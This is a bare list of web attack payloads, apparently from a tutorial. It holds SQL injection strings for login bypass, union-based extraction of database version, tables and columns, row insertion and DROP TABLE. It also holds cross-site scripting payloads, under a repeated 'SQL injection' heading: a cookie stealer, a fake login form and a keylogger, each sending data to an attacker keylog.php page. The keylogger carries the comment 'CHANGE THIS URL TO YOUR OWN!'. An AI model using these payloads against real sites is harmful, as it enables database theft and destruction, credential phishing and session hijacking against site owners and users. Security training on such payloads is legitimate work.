************************************************* SQL injection Queries ***********************************
hsoub';--
___________________________________________________________________________________________________________
' or '1'='1';--  
___________________________________________________________________________________________________________
hsoub' order by 1;--

hsoub' order by 7;--
___________________________________________________________________________________________________________
' union select 1,2,3,4,5,6 from member;--
___________________________________________________________________________________________________________
' union select 1,@@version,current_user(),4,5,6 from member;--
___________________________________________________________________________________________________________
' UNION SELECT 1,table_name,3,4,5,6 FROM information_schema.tables WHERE table_schema = 'db_member';-- 

' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_schema = 'db_member';--
___________________________________________________________________________________________________________
' UNION SELECT 1,column_name,3,4,5,6 FROM information_schema.columns WHERE table_name = 'member';--
___________________________________________________________________________________________________________
' union select 1,2,3 from admin;--
___________________________________________________________________________________________________________
' union select 1,2,3,4,5,6 from admin;--
___________________________________________________________________________________________________________
'; INSERT INTO comment VALUES (25,'hacker','hacker');--    
___________________________________________________________________________________________________________
'; DROP TABLE admin;--


************************************************* SQL injection Queries ***********************************
<h1>تمت مهاجمتك</h1>
___________________________________________________________________________________________________________
<img src="https://picsum.photos/id/465/200/300" alt="Smiley face" width="42" height="42">
___________________________________________________________________________________________________________
<script>alert(document.cookie)</script>
___________________________________________________________________________________________________________
<script>
new Image().src="http://localhost/attacker_website/keylog.php
?output="+document.cookie;
</script>
___________________________________________________________________________________________________________
<h3>Please login to proceed</h3>
<form action=http://localhost/attacker_website/keylog.php>
Username:<br><input type="username" name="username"></br>
Password:<br><input type="password" name="password"></br>
<br><input type="submit" value="Logon">
</br>
</form>
___________________________________________________________________________________________________________
<script>
var presses = [];
window.addEventListener("keydown", function(evt){
  presses.push(evt.key);
});
window.setInterval(function () {
  if (presses.length>5) {
    var data = encodeURIComponent(JSON.stringify(presses));
    new Image().src = "http://localhost/attacker_website/keylog.php?k=" + data; // CHANGE THIS URL TO YOUR OWN!
    presses = [];
  }
}, 500);
</script>



